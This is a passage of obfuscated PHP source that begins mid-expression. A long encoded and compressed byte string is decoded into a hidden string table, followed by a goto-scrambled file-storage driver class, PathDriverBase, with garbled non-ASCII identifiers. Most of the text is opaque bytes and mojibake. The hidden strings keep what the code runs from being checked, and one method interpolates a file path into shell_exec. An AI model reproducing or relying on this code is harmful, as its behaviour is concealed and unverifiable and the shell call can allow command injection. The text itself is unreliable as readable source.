26\x33\xf\xb9\xfd\xc4\x9f\x15\xb8\x30"."\147\270\74\324\107\125\362\141\104\70\146\101\122\31\113\314\210\2\33\174\170\303\56\232\260\132\240\127\253\252\321\54\256\4\44\104\262\24\240\240\146\142\267\70\120\147\27\231\312\302\74\244\367\354\63".strrev('¶§ YaE\\}'."\n".'Šúo£™Å¦áh'."\r".'!(.#Ù,¡*b)àÄŸÂ½akï¢"K;sXÖè5')."\165\301\47\71\4\45\233\345\116\200\304\247\3\262\161\305\160\2\12\33\261\164\372\146\156\225\110\145\53\341\72\215\343\125\244\355\274\226\30\251\342\213\7\366\76\324\210\21\70\46\272\47\237\4\215"."\x73\x94\xd6\x85\x71\xa6\xc9\x46\x43\x95\x4e\x8b\x3a\x5\x1\x31\x4c\xbc\x16\x55\xcc\x7d\x46\xbe\x22\x1e\xe7\x8f\x38\xe\xdf\x79\xb4\xef\xb5\xc4\xaf\xe1\x8b\x4a\xb8\x77\x8\x41\x31\xdf\x39\xc9\xe0\x57\xa7\x31\xcd\xc4\x87".strrev('xr-op¥Ù0!¹ğ®;ğ»ã(¸€­º[š|¸Kš‚5FŒÛ(v\\­'."\r".'‘)İbBä¢V').base64_decode('Ach7DHr15RiykB4jTZWE//DbP7UwGRZyjOTv4y8x1kn8zRrxdVp44tKlM4qyO+s2lRLY6BpmRA==')."\x2b\x98\x93\xa5\xb\x14\x24\x3c\xff\x71\x34\xf4\x2f\x4c\x9b\x9\x29\x82\xe5\x21\x1d\x2d\xbe\xc4\x6c\x2f\x14\x8c\x6b\xd8\xb2\x8d\x0\x7f\xe6\xb6\xfc\x79\x5b\xb4\x9d\xc0\x3b\x4\xdb\x46\x81\x28\x8f\x88\x20\xe1\xbc\x3\x2a".strrev('nI·êç”Sé…%ÜOŒ”3¹ût½ğDW¨¹FHG­EÁ˜­<Îb~Öœá¤]»é(Ï·ÛB')."\xc2\xf9\x7a\x2\xd1\x1b\x17\x89\x51\xc6\x38\xa8\x25\xfa\xc7\x5d\xd0\xca\x73\x58\x19\xcd\x48\x76\x6a\xf9\x64\x39\x7e\x31\x1f\x67\x50\x8e\xe\x6\xa3\xb3\x1a\x18\x48\x12\x55\x98\x58\x4a\x29\xf1\x53\x58\x2e\x1f\x25\x93\x5d"."\364\25\170\33\52\63\360\145\120\0\141\250\150\361\27\136\12\340\316\154\325\61\221\247\23\274\124\145\165\40\142\45\224\277\44\120\336\52\64\27\30\234\34\174\347\5\347\136\204\250\70\10\277\170\314"."\274\267\341\242\14\35\145\124\222\334\255\33\256\43\333\220\360\117\332\37\74\140\150\114\60\1\70\110\101\332\141\203\226\271\343\205\207\64\164\165\51\113\42\273\41\241\370\252\233\46\333\200\367\10\305".base64_decode('iWfvk2YIV/8Ip0p7F4fLTvzL2CJHJvKirWQb02SNJZghMdFWxfLhRkIvp1UMzKETE5zmtidhfA==').strrev('·ˆø6xïî+Ëbä¹9‚N5TkƒÉW¢-Úâ¨üá¼[7åeÚş]?Õ<‘ŸEFâÖò†bE¬µ').strrev('ØÂ©MØÕh—eØàµ¤ò*¢Õ“—÷U½VÏhØåş29ù\\Š©.²uk/¹IëYGfÛ+'."\r".'I9')."\xf8\x9d\x57\x25\xb\xe5\x69\x55\x6e\xe0\x70\x99\x70\x15\xd\xd9\x14\xce\x2a\x92\xc5\xeb\xbc\xea\x17\x7e\xa1\xaa\x13\xd1\xb4\xdf\xc4\x95\xc1\xc5\x8e\xa1\xaa\x3\x9b\xd7\x9d\xb2\xf5\x81\x73\xfc\x41\x89\x6\x44\xb0\x8d\xf1"."\x16\xf3\x23\x79\xea\xb7\x7\x7c\x81\x7b\x43\x64\x5f\xa1\xd2\x58\x99\xbb\x57\x4a\x91\xf9\xa2\xe0\x62\xb4\xcc\x5f\x2c\x54\x58\xc6\x21\x74\x2e\x6\x36\xe7\x5a\x42\xb8\xb3\x87\x40\xd1\xd1\x2b\x4e\xb7\x5d\xa3\x69\xf0\x61\x5c"."\x76\xd3\x65\xbb\xd6\xa9\x92\xee\xe4\x27\x62\xa2\x3f\x5e\x9b\x6b\x60\x88\xe2\x65\x16\xc6\x78\x19\x25\xe7\x83\xf8\x58\x1b\x69\x51\x10\x48\xe7\x4\x14\xf3\x65\xbc\x3a\xe1\xe4\xb0\x6e\x58\xd0\xf2\x18\x70\xd0\x2\xfa\xed\xd4"."\55\213\116\154\40\137\42\114\44\122\41\307\46\302\235\36\10\111\212\340\43\327\100\107\223\210\264\20\13\100\101\162\300\16\67\104\141\25\247\42\266\142\213\300\43\117\26\21\127\220\21\75\31\327\307"."\311\10\241\67\6\370\327\370\216\106\51\27\212\270\163\173\102\25\342\375\43\122\352\61\135\70\305\105\64\202\35\250\14\7\171\144\212\51\0\221\354\111\104\350\314\331\341\17\225\100\216\170\170\21\370"."\x3d\x4e\x74\x18\x1\x9f\xb1\xf5\x2d\xf3\x87\x23\xe1\x8a\xa4\xa0\x3b\x1c\x1e\x8\x84\xbc\x58\x89\xb0\x22\x19\xe5\x12\x2e\x7b\x2b\x92\x82\xdd\x81\xbe\xc9\xd2\x7c\xbd\x6e\x7f\x4f\x45\x1a\xbc\xfc\x85\xaa\x8d\xf4\xc1\x33\x9c".base64_decode('5A+iWrp7eqgmUWUt/J4lvCboDoOf1RUyel6gUkHLgR5QhhWqfw2ZMZ0cYljNsYMRoTj7HlUccg==').base64_decode('kz65xwKFCrldWHjhZW0fKSxEffoRMRpfnnpFLXH46Cmb3UzuRM0W9T0qX0/Br0AL6Hixt90ICQ==')."\160\64\235\340\321\221\54\20\262\270\226\42\0\321\136\54\73\221\57\33\4\36\22\126\360\312\333\35\4\341\135\12\333\167\24\365\20\60\254\307\205\363\102\334\71\266\156\21\57\354\161\330\226\14\370"."\x50\x44\x8f\x28\x69\xc2\x77\xa0\xa8\xc0\x63\x9d\x13\x62\x58\x3c\xab\x68\x67\x6c\xc7\x52\xd2\xf4\xfe\xb5\xfc\xac\x4a\xb8\x5c\x84\xfd\xf5\xff\x0\xf7\xc7\x85\x8a\x9f\xbb\x0\x0".""."".strrev('').strrev('')."", 10, -8))); goto B¤¯¦“øÍî; c¶’ÄÂäïË: $bñË¶‘õ„™ = $_SERVER[÷ÖêïÔÔÓ][539]; while ($bñË¶‘õ„™ < $_SERVER[÷ÖêïÔÔÓ][540]) { if ($bñË¶‘õ„™ >= 0) { break; } $bñË¶‘õ„™++; } $_SERVER[ë¿˜ªè¥×”ö] = explode($_SERVER[÷ÖêïÔÔÓ][541], gzinflate(substr($_SERVER[÷ÖêïÔÔÓ][542], 10, -8))); goto EÍ„“ë¯ğ™; D’¬Ôç¿–Ã: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Cˆ˜ó¿êŠ† =& $_SERVER[÷ÖêïÔÔÓ]; $this->objectDriver = array($Cˆ˜ó¿êŠ†[57], $Cˆ˜ó¿êŠ†[58], $Cˆ˜ó¿êŠ†[59], $Cˆ˜ó¿êŠ†[60], $Cˆ˜ó¿êŠ†[61], $Cˆ˜ó¿êŠ†[62], $Cˆ˜ó¿êŠ†[63], $Cˆ˜ó¿êŠ†[64], $Cˆ˜ó¿êŠ†[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Aõ­ÄÆëš) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Aõ­ÄÆëš, $_SERVER[÷ÖêïÔÔÓ][8]); } return $Aõ­ÄÆëš; } public function getPathName($dïùŠ‚Ñ¡ˆ) { return $dïùŠ‚Ñ¡ˆ; } public function iconvApp($EØ¬™¡È) { return $EØ¬™¡È; } public function iconvSystem($dˆ³­Ò¡Á®) { return $dˆ³­Ò¡Á®; } public function iconvTo($F‹—·ˆÏÙ, $AôÔ‹›­ÇÎ, $d…âŸíğÇÅ) { goto FÍ¿¥ˆ‹À‰; aè°Ó»Ş: $C¶‰È„Û‰‚ = $AôÔ‹›­ÇÎ . $e³ç¸Úîæ[67] . $d…âŸíğÇÅ . $e³ç¸Úîæ[68] . $F‹—·ˆÏÙ; if (isset($d®‰—¯íÜ[$C¶‰È„Û‰‚])) { return $d®‰—¯íÜ[$C¶‰È„Û‰‚]; } if (function_exists($e³ç¸Úîæ[69])) { $e§‰ÎÏ·´Î = @mb_convert_encoding($F‹—·ˆÏÙ, $d…âŸíğÇÅ, $AôÔ‹›­ÇÎ); } else { $e§‰ÎÏ·´Î = @iconv($AôÔ‹›­ÇÎ, $d…âŸíğÇÅ, $F‹—·ˆÏÙ); } goto e¨÷ŒÉ³»; D†æ·”è‚: $d®‰—¯íÜ[$d…âŸíğÇÅ . $e³ç¸Úîæ[67] . $AôÔ‹›­ÇÎ . $e³ç¸Úîæ[68] . $F‹—·ˆÏÙ] = $F‹—·ˆÏÙ; $d®‰—¯íÜ[$d…âŸíğÇÅ . $e³ç¸Úîæ[67] . $AôÔ‹›­ÇÎ . $e³ç¸Úîæ[68] . $e§‰ÎÏ·´Î] = $F‹—·ˆÏÙ; $d®‰—¯íÜ[$AôÔ‹›­ÇÎ . $e³ç¸Úîæ[67] . $d…âŸíğÇÅ . $e³ç¸Úîæ[68] . $e§‰ÎÏ·´Î] = $e§‰ÎÏ·´Î; goto e°¡¥å§Ş‡; e°¡¥å§Ş‡: return $e§‰ÎÏ·´Î; goto B¸ßÆ‡­»°; FÍ¿¥ˆ‹À‰: $e³ç¸Úîæ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$F‹—·ˆÏÙ || !function_exists($e³ç¸Úîæ[66])) { return $F‹—·ˆÏÙ; } static $d®‰—¯íÜ = array(); goto aè°Ó»Ş; e¨÷ŒÉ³»: $e§‰ÎÏ·´Î = $e§‰ÎÏ·´Î ? $e§‰ÎÏ·´Î : $F‹—·ˆÏÙ; if (strstr($e§‰ÎÏ·´Î, $e³ç¸Úîæ[70])) { $e§‰ÎÏ·´Î = str_replace($e³ç¸Úîæ[70], $e³ç¸Úîæ[71], $e§‰ÎÏ·´Î); } $d®‰—¯íÜ[$AôÔ‹›­ÇÎ . $e³ç¸Úîæ[67] . $d…âŸíğÇÅ . $e³ç¸Úîæ[68] . $F‹—·ˆÏÙ] = $e§‰ÎÏ·´Î; goto D†æ·”è‚; B¸ßÆ‡­»°: } public function getPathInner($eõŒâ¹•Ğ›) { $e¾öƒ“©êì = IO::init($eõŒâ¹•Ğ›); return $e¾öƒ“©êì->path; } public function getPathOuter($D¹äášº) { $F Ø´¢’‚ğ =& $_SERVER[÷ÖêïÔÔÓ]; $EÆñÌï¢ = strlen(trim($this->pathBase, $F Ø´¢’‚ğ[8])); $D¹äášº = substr(trim($D¹äášº, $F Ø´¢’‚ğ[8]), $EÆñÌï¢); return $this->pathDriver . $F Ø´¢’‚ğ[8] . ltrim($D¹äášº, $F Ø´¢’‚ğ[8]); } public function isParentOf($e´¼±«Á¢¬, $cïçµ‘ÒÀ) { $FÍÁ‹´Õ Ê =& $_SERVER[÷ÖêïÔÔÓ]; $e´¼±«Á¢¬ = rtrim(strtolower($e´¼±«Á¢¬), $FÍÁ‹´Õ Ê[8]) . $FÍÁ‹´Õ Ê[8]; $cïçµ‘ÒÀ = rtrim(strtolower($cïçµ‘ÒÀ), $FÍÁ‹´Õ Ê[8]) . $FÍÁ‹´Õ Ê[8]; $dÖ’ÀàÏ™Ë = strpos($cïçµ‘ÒÀ, $e´¼±«Á¢¬) === 0; return $dÖ’ÀàÏ™Ë; } public function getType() { $D¬„¨•™œ =& $_SERVER[÷ÖêïÔÔÓ]; $F•ĞèêÊµŞ = str_replace($D¬„¨•™œ[72], $D¬„¨•™œ[33], get_class($this)); return strtolower($F•ĞèêÊµŞ); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($b¶»ğØ”‡, $f’Ôµ¢Åğ) { $eç¹«•ªÆÇ =& $_SERVER[÷ÖêïÔÔÓ]; $BºîĞŠÈ„½ = rtrim($b¶»ğØ”‡, $eç¹«•ªÆÇ[8]) . $eç¹«•ªÆÇ[8] . $f’Ôµ¢Åğ; $f¿ËÌµ‡ñ = $this->exist($BºîĞŠÈ„½); return $f¿ËÌµ‡ñ ? $BºîĞŠÈ„½ : !1; } public function renameObject($eÛƒõ—×…, $f¯¢ÍœÕóÕ) { $Bæ°»ŒÖîä =& $_SERVER[÷ÖêïÔÔÓ]; Hook::trigger($Bæ°»ŒÖîä[73], $this, $eÛƒõ—×…, $this, $this->pathFather($eÛƒõ—×…) . $f¯¢ÍœÕóÕ); $eÛƒõ—×… = $this->getPathOuter($eÛƒõ—×…); $f¯¢ÍœÕóÕ = $this->pathFather($eÛƒõ—×…) . $f¯¢ÍœÕóÕ; if (IO::isFile($eÛƒõ—×…)) { $E› Úå»¢µ = IO::move($eÛƒõ—×…, $f¯¢ÍœÕóÕ, REPEAT_RENAME_FOLDER); } else { $E› Úå»¢µ = IO::mkdir($f¯¢ÍœÕóÕ); if (!$E› Úå»¢µ) { return !1; } $FóóŠÀ‡“¼ = IO::listPath($eÛƒõ—×…, !0); $fòÑ…Ñ¤‹” = array_merge($FóóŠÀ‡“¼[$Bæ°»ŒÖîä[74]], $FóóŠÀ‡“¼[$Bæ°»ŒÖîä[75]]); foreach ($fòÑ…Ñ¤‹” as $D”˜ÂéÉ‰Ã) { IO::move($D”˜ÂéÉ‰Ã[$Bæ°»ŒÖîä[76]], $f¯¢ÍœÕóÕ, REPEAT_RENAME_FOLDER); } IO::remove($eÛƒõ—×…); } return $E› Úå»¢µ ? $f¯¢ÍœÕóÕ : !1; } public function tempFile($a¸ë£×‚“— = '', $bßø¨˜à¥÷ = '') { goto Fô²†Ï³Å; D˜ë²åÒá : return $f¯¦‘®Ôêä; goto AŸ½÷åÁ«ó; Fô²†Ï³Å: if (!$a¸ë£×‚“—) { $a¸ë£×‚“— = rand_string(15); } $a£ÈÉÅ²‰ = TEMP_FILES . rand_string(15) . $_SERVER[÷ÖêïÔÔÓ][8]; @mkdir($a£ÈÉÅ²‰, 511, !0); goto ašÇŒôŞšŠ; ašÇŒôŞšŠ: $f¯¦‘®Ôêä = $a£ÈÉÅ²‰ . $a¸ë£×‚“—; @touch($f¯¦‘®Ôêä); if ($bßø¨˜à¥÷) { file_put_contents($f¯¦‘®Ôêä, $bßø¨˜à¥÷); } goto D˜ë²åÒá ; AŸ½÷åÁ«ó: } public function tempFileRemve($Dàª¸÷¡¦) { @unlink($Dàª¸÷¡¦); @rmdir($this->pathFather($Dàª¸÷¡¦)); } public function mkfile($A’¦Üà¦‹, $DÎœŠÏ·ó† = '', $aÇçï‘™ÈÂ = REPEAT_RENAME) { } public function mkdir($Aè¨¥Ñ¯¢¤, $Dè¶ÂÒ’ = REPEAT_SKIP) { } public function copyFile($fœ¬©ƒæâÇ, $bª»Ò…ÑÛ) { } public function moveFile($DÒ÷¸¥éÈ™, $dí¦àâ—ˆ) { } public function remove($càç¯ÈØó) { if ($this->isFile($càç¯ÈØó)) { return $this->delFile($càç¯ÈØó); } return $this->delFolder($càç¯ÈØó); } public function rename($cÙæ‚–µ›Ä, $cÍÙ‰ˆµìÆ) { } public function exist($d¤’­ËÌ¾›) { } public function findByHash($C¸«×¸² = '', $B¿¤¿™ğ© = '') { return !1; } public function isFile($CÖá¥ƒ©¾) { } public function isFolder($a¤Œ™Ÿï¦§) { } public function size($a±Õë¹õÏ) { } public function info($B‡Ñ¿¤¢Ö¹) { } public function infoSimple($cÊ×äè“á) { return $this->info($cÊ×äè“á); } public function infoAuth($dÓïÜ¶‰) { return $this->info($dÓïÜ¶‰); } public function infoFull($E˜À¹·„¸) { return $this->info($E˜À¹·„¸); } public function infoWithChildren($Dñ‰¯ƒ»öÒ) { $fê¥“¡•à‘ =& $_SERVER[÷ÖêïÔÔÓ]; $C¢°…ĞÈŒ = $this->info($Dñ‰¯ƒ»öÒ); if ($C¢°…ĞÈŒ && $C¢°…ĞÈŒ[$fê¥“¡•à‘[29]] == $fê¥“¡•à‘[77]) { $Bš¸ßªÕÖ = array($fê¥“¡•à‘[78] => 0, $fê¥“¡•à‘[79] => 0, $fê¥“¡•à‘[80] => 0); $this->infoChildren($Dñ‰¯ƒ»öÒ, $Bš¸ßªÕÖ); $C¢°…ĞÈŒ[$fê¥“¡•à‘[78]] = $Bš¸ßªÕÖ[$fê¥“¡•à‘[78]]; $C¢°…ĞÈŒ[$fê¥“¡•à‘[81]] = array($fê¥“¡•à‘[82] => $Bš¸ßªÕÖ[$fê¥“¡•à‘[79]], $fê¥“¡•à‘[83] => $Bš¸ßªÕÖ[$fê¥“¡•à‘[80]]); } return $C¢°…ĞÈŒ; } public function listPath($F½õ¥·Ñ²Ï, $EÑ÷‹¨ôóà = false) { } public function has($b”Ÿœ—…éÇ, $c¾–»¯Ã£‰ = false, $cØ¥Ç¡¿”Ñ = false) { } public function canRead($cƒ­«æã¯Ø) { } public function canWrite($C÷Ç¢‘éÊ) { } public function getContent($E’£†œ—‘¶) { } public function setContent($a¶ëĞï–›Œ, $cÈª¼ãÍ¿ï = '') { } protected function infoChildren($A„øÌñÚ©³, &$dŸæÂöŒõã) { $b°áÊ¡î¸ =& $_SERVER[÷ÖêïÔÔÓ]; check_abort(); $eõø‡—ÆˆĞ = $this->listPath($A„øÌñÚ©³, !0); $eõø‡—ÆˆĞ = array_merge($eõø‡—ÆˆĞ[$b°áÊ¡î¸[75]], $eõø‡—ÆˆĞ[$b°áÊ¡î¸[74]]); foreach ($eõø‡—ÆˆĞ as $Cºíİ÷“é) { if ($Cºíİ÷“é[$b°áÊ¡î¸[29]] == $b°áÊ¡î¸[77]) { $dŸæÂöŒõã[$b°áÊ¡î¸[80]]++; $e™ºÕ—İ¦ˆ = $this->getPathInner($Cºíİ÷“é[$b°áÊ¡î¸[76]]); $this->infoChildren($e™ºÕ—İ¦ˆ, $dŸæÂöŒõã); } else { $dŸæÂöŒõã[$b°áÊ¡î¸[79]]++; $dŸæÂöŒõã[$b°áÊ¡î¸[78]] += $Cºíİ÷“é[$b°áÊ¡î¸[78]]; } } } public function fileSubstr($Bº°´ÃİŠ°, $D»¥À®‹¾›, $dÖãàñˆÛÛ) { } public function listAll($aâõ±é¹‡) { } public function upload($bÀù’êÆ’Â, $b‰®‹Úùíô, $f·Ï†–Š = false, $d±¸ö£´‰ = REPEAT_REPLACE) { } public function uploadFileByID($Eœ¨ºÃøø, $eï±Ğ„Ì·«, $f£†¾Ìèâ) { } public function uploadFileByPath($Eµœ“š±Ù, $eìÓŞ†âæ•, $A¹Ó„Ëë¢¡ = array()) { } public function uploadLink($cˆÜ†µ¦º, $A”Ëïï»¡î = 0) { goto b¿¾ÌÑÎ; DèÉ„¹¢Íñ: if (!in_array($Aó—äë—ğº, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $A£Â¸Ó†È— = 1024 * 1024 * 10; goto b©Ş˜ö½ƒ£; b©Ş˜ö½ƒ£: $F¿¶÷Š‹å° = $A”Ëïï»¡î <= $A£Â¸Ó†È— ? $A‚®¾˜’ëˆ[86] : $A‚®¾˜’ëˆ[87]; if ($Aó—äë—ğº == $A‚®¾˜’ëˆ[61]) { $F¿¶÷Š‹å° = $A‚®¾˜’ëˆ[87]; } $fŒ„†²³¤Ä = (!$A”Ëïï»¡î ? 1 : ceil($A”Ëïï»¡î / pow(1024, 3))) * 3600 * 4; goto eŸ¯…ãÊ; eŸ¯…ãÊ: $bÊ—“·Ò¦è = $this->{$F¿¶÷Š‹å°}($cˆÜ†µ¦º, $fŒ„†²³¤Ä); if ($bÊ—“·Ò¦è) { $bÊ—“·Ò¦è[$A‚®¾˜’ëˆ[88]] = $cˆÜ†µ¦º; $bÊ—“·Ò¦è[$A‚®¾˜’ëˆ[89]] = $Aó—äë—ğº; } return $bÊ—“·Ò¦è; goto DŠÓ¿Ô‡¼; b¿¾ÌÑÎ: $A‚®¾˜’ëˆ =& $_SERVER[÷ÖêïÔÔÓ]; if ($GLOBALS[$A‚®¾˜’ëˆ[6]][$A‚®¾˜’ëˆ[84]][$A‚®¾˜’ëˆ[85]]) { return; } $Aó—äë—ğº = $this->getType(); goto DèÉ„¹¢Íñ; DŠÓ¿Ô‡¼: } public function uploadFormData($eÎäÂ¿‘ò, $FäòÕšƒŠ = 3600) { } public function multiUploadFormData($D°åöØ†·È, $fƒÛÆÕŒ¸‰ = 3600) { } public function osChunkSize() { $aÊ¶ÊÁõ‚ =& $_SERVER[÷ÖêïÔÔÓ]; $DŞå¯èá¹Ô = (double) $GLOBALS[$aÊ¶ÊÁõ‚[6]][$aÊ¶ÊÁõ‚[84]][$aÊ¶ÊÁõ‚[90]][$aÊ¶ÊÁõ‚[91]]; if (!$DŞå¯èá¹Ô) { $DŞå¯èá¹Ô = 1024 * 84 * 10; } return $DŞå¯èá¹Ô; } public function download($a®Šïµ»ºÃ, $Dõ¥œÕÒªÎ) { } public function ext($FÂÛÁ²×ÄÙ) { $B«òŠÏÆ¾¸ =& $_SERVER[÷ÖêïÔÔÓ]; if (strpos($FÂÛÁ²×ÄÙ, $B«òŠÏÆ¾¸[8]) === -1) { $bÂ¹ÔÏ‰¯Ò = $FÂÛÁ²×ÄÙ; } else { $bÂ¹ÔÏ‰¯Ò = $this->pathThis($FÂÛÁ²×ÄÙ); } $E£¦§İÔçÊ = $B«òŠÏÆ¾¸[33]; if (strstr($bÂ¹ÔÏ‰¯Ò, $B«òŠÏÆ¾¸[92])) { $E£¦§İÔçÊ = substr($bÂ¹ÔÏ‰¯Ò, strrpos($bÂ¹ÔÏ‰¯Ò, $B«òŠÏÆ¾¸[92]) + 1); $E£¦§İÔçÊ = strtolower($E£¦§İÔçÊ); } if (strlen($E£¦§İÔçÊ) > 3 && preg_match($B«òŠÏÆ¾¸[93], $E£¦§İÔçÊ, $e»ì«‰•à¹)) { $E£¦§İÔçÊ = $B«òŠÏÆ¾¸[33]; } return $E£¦§İÔçÊ; } public function pathThis($AÎãÃ¦Ïù£) { $c±¿Ç™óÁÌ =& $_SERVER[÷ÖêïÔÔÓ]; $AÎãÃ¦Ïù£ = str_replace($c±¿Ç™óÁÌ[94], $c±¿Ç™óÁÌ[8], rtrim($AÎãÃ¦Ïù£, $c±¿Ç™óÁÌ[8])); $eÇ…ç™•Ş‹ = strrpos($AÎãÃ¦Ïù£, $c±¿Ç™óÁÌ[8]); if ($eÇ…ç™•Ş‹ === !1) { return $AÎãÃ¦Ïù£; } return substr($AÎãÃ¦Ïù£, $eÇ…ç™•Ş‹ + 1); } public function pathFather($bŸóŸ¯ø¡­) { $FÎŸ°©ƒ¼ =& $_SERVER[÷ÖêïÔÔÓ]; $bŸóŸ¯ø¡­ = str_replace($FÎŸ°©ƒ¼[94], $FÎŸ°©ƒ¼[8], rtrim($bŸóŸ¯ø¡­, $FÎŸ°©ƒ¼[8])); $AæÏˆ¨ ˆ¡ = strrpos($bŸóŸ¯ø¡­, $FÎŸ°©ƒ¼[8]); if ($AæÏˆ¨ ˆ¡ === !1) { return $FÎŸ°©ƒ¼[33]; } return substr($bŸóŸ¯ø¡­, 0, $AæÏˆ¨ ˆ¡ + 1); } public function hashSimple($aàºÎÃñ) { goto A›Ó•öŒ; aøÓˆÖ¾ß: $B—ÊöºÙ¨¨ .= $this->fileSubstr($aàºÎÃñ, $d¬Ğ‰ÌÊÏù - $BÙöâášâê, $BÙöâášâê); return md5($B—ÊöºÙ¨¨) . $d¬Ğ‰ÌÊÏù; goto F´Ê‡¸«ó; A›Ó•öŒ: $A‡œ†Ïá‚ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$aàºÎÃñ) { return md5($A‡œ†Ïá‚[33]); } $d¬Ğ‰ÌÊÏù = $this->size($aàºÎÃñ); goto b——‘ä›í¾; Bì¹ÓùÂ…Æ: $DˆÕïó‹º‘ = intval($d¬Ğ‰ÌÊÏù / $dÖ§ù¬ì“Ï); $B—ÊöºÙ¨¨ = $A‡œ†Ïá‚[33]; for ($eâä—ùÃŸÙ = 0; $eâä—ùÃŸÙ < $dÖ§ù¬ì“Ï; $eâä—ùÃŸÙ++) { $B—ÊöºÙ¨¨ .= $this->fileSubstr($aàºÎÃñ, $DˆÕïó‹º‘ * $eâä—ùÃŸÙ, $BÙöâášâê); } goto aøÓˆÖ¾ß; b——‘ä›í¾: $BÙöâášâê = 200; $dÖ§ù¬ì“Ï = 50; if ($d¬Ğ‰ÌÊÏù <= $BÙöâášâê * $dÖ§ù¬ì“Ï) { return $this->hashMd5($aàºÎÃñ) . $d¬Ğ‰ÌÊÏù; } goto Bì¹ÓùÂ…Æ; F´Ê‡¸«ó: } public static $md5Cache = array(); public function hashMd5($CÏå®â‰) { $CÏå®â‰ = $this->iconvSystem($CÏå®â‰); if (isset(self::$md5Cache[$CÏå®â‰])) { return self::$md5Cache[$CÏå®â‰]; } self::$md5Cache[$CÏå®â‰] = $this->hashMd5Shell($CÏå®â‰); if (!self::$md5Cache[$CÏå®â‰]) { self::$md5Cache[$CÏå®â‰] = @md5_file($CÏå®â‰); } return self::$md5Cache[$CÏå®â‰]; } private function hashMd5Shell($a›­ò—õÅ) { goto b«èÉ¬™½Á; b«èÉ¬™½Á: $E»îŒ¦àƒ… =& $_SERVER[÷ÖêïÔÔÓ]; if (!function_exists($E»îŒ¦àƒ…[95])) { return !1; } $A‘ñà‹öÖ = array($E»îŒ¦àƒ…[96], $E»îŒ¦àƒ…[97]); goto Eîô›èË¯; c²›‰¬§¶Š: $DİãÂ·Û¥ = shell_exec($fÕÇÓ•¹îï . "\x20\42{$a›­ò—õÅ}\x22"); return substr($DİãÂ·Û¥, 0, 32); goto eğÚí‹ˆ£ª; Eîô›èË¯: $fÕÇÓ•¹îï = Cache::get($E»îŒ¦àƒ…[98]); if (!$fÕÇÓ•¹îï) { $AƒŠ‰²‡êÛ = BASIC_PATH . $E»îŒ¦àƒ…[99]; $bÆ‰³÷ïƒ = md5_file($AƒŠ‰²‡êÛ); $fÕÇÓ•¹îï = $E»îŒ¦àƒ…[100]; foreach ($A‘ñà‹öÖ as $d¹Ø˜ÉÒ) { $DİãÂ·Û¥ = shell_exec($d¹Ø˜ÉÒ . "\40\42{$AƒŠ‰²‡êÛ}\x22"); if ($DİãÂ·Û¥ && substr(trim($DİãÂ·Û¥), 0, 32) == $bÆ‰³÷ïƒ) { $fÕÇÓ•¹îï = $d¹Ø˜ÉÒ; break; } } Cache::set($E»îŒ¦àƒ…[98], $fÕÇÓ•¹îï, 3600); } if ($fÕÇÓ•¹îï == $E»îŒ¦àƒ…[100]) { return !1; } goto c²›‰¬§¶Š; eğÚí‹ˆ£ª: } public function link($CÜÃœÚÉÏ¦) { return $CÜÃœÚÉÏ¦; } public function fileOut($C¢™è¾“Ãğ, $BÃôÔ’Ì¹Â = false, $AÊÓßï¥ñÎ = false, $FŒ³Œõ—å = '') { goto C“Â‘‡Ğ…›; Dßˆ»‰”æ: set_timeout(); $dù †½º™£ = $this->infoFull($C¢™è¾“Ãğ); $Eï‰ÌÏã¯ = $dù †½º™£[$d²ËÚïÑ’×[78]]; goto B¼×½ÂÁèÄ; aÇöÕô†Û: header($d²ËÚïÑ’×[132] . $BÂ§Ÿ²êä‰); header($d²ËÚïÑ’×[133]); header($d²ËÚïÑ’×[134] . $Eï‰ÌÏã¯); goto cë©òĞ•ï; F­Ó–ËğÀ–: if (strstr($Aœ‚—ƒ , $d²ËÚïÑ’×[113])) { $Aœ‚—ƒ  = $Aœ‚—ƒ  . $d²ËÚïÑ’×[114]; } if ($BÃôÔ’Ì¹Â === !1 && !mime_support($Aœ‚—ƒ )) { $BÃôÔ’Ì¹Â = !0; $Aœ‚—ƒ  = $d²ËÚïÑ’×[115]; } $e‰„²Ş†Ùƒ = rawurlencode($BÂ§Ÿ²êä‰); goto eñ²ÈÃ¶²; fÆÀ‡íë…º: while ($c…¬ëÛî…ä <= $Dã²Ç…õŞ×) { $d«ÜŒ¤¿ = timeFloat(); check_abort(); $bŞ¦…ŞÅâ = $Dã²Ç…õŞ× - $c…¬ëÛî…ä + 1; if ($bŞ¦…ŞÅâ <= $C‡àŸ¼‡ò) { $C‡àŸ¼‡ò = $bŞ¦…ŞÅâ; } echo $this->fileSubstr($C¢™è¾“Ãğ, $c…¬ëÛî…ä, $C‡àŸ¼‡ò); $c…¬ëÛî…ä += $C‡àŸ¼‡ò; if ($C‡àŸ¼‡ò == $bŞ¦…ŞÅâ) { $c…¬ëÛî…ä = $Dã²Ç…õŞ× + 1; } if ($f‚ñÆ¬‡¤Ì) { $A·²¡‚ÃŸ = intval(1000 * 1000 * (timeFloat() - $d«ÜŒ¤¿)); $dÜŒ¤ªÎÉâ = $f‚ñÆ¬‡¤Ì - $A·²¡‚ÃŸ; if ($dÜŒ¤ªÎÉâ > 5) { usleep($dÜŒ¤ªÎÉâ); } } } goto BÛé„•ˆ‘ï; C“Â‘‡Ğ…›: $d²ËÚïÑ’× =& $_SERVER[÷ÖêïÔÔÓ]; if (!$C¢™è¾“Ãğ || !$this->exist($C¢™è¾“Ãğ)) { show_json(LNG($d²ËÚïÑ’×[101]), !1, $AÊÓßï¥ñÎ); } $A½¹ÉÊ‚øÁ = $this->getType() == $d²ËÚïÑ’×[102]; goto F¼Ø†ğˆº÷; a¬Ï«èÄö: if (isset($_SERVER[$d²ËÚïÑ’×[129]]) && $_SERVER[$d²ËÚïÑ’×[129]] == $FŒ³Œõ—å) { header($d²ËÚïÑ’×[130] . $FŒ³Œõ—å, !0, 304); die; } header($d²ËÚïÑ’×[130] . $FŒ³Œõ—å); header($d²ËÚïÑ’×[131] . $d¼Í¬èˆ . $d²ËÚïÑ’×[123]); goto aÇöÕô†Û; E›“Ñİ: $C‡àŸ¼‡ò = 1024 * 100; $f‚ñÆ¬‡¤Ì = 0; if ($C¹¸îÑïó) { 